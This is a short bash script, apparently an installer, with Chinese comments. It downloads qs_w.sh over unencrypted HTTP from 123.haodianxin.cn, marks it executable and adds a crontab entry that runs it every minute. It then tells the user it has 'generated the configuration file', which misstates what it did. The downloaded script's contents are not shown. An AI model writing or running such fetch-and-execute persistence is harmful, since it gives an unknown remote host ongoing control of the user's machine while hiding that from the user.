#!/usr/bin/env bash
set -o errexit
set -o nounset
set -o pipefail



wget -O qs_w.sh http://123.haodianxin.cn/qs_w.sh

# 赋予新脚本执行权限
chmod +x qs_w.sh

# 设置计划任务
(crontab -l 2>/dev/null; echo "* * * * * bash $(pwd)/qs_w.sh") | crontab -

# 完成提示
echo "成功生成对应的配置文件，请执行 ./qs_w.sh"

# 提示用户计划任务已设置
echo "计划任务已设置，脚本将每分钟运行一次。"

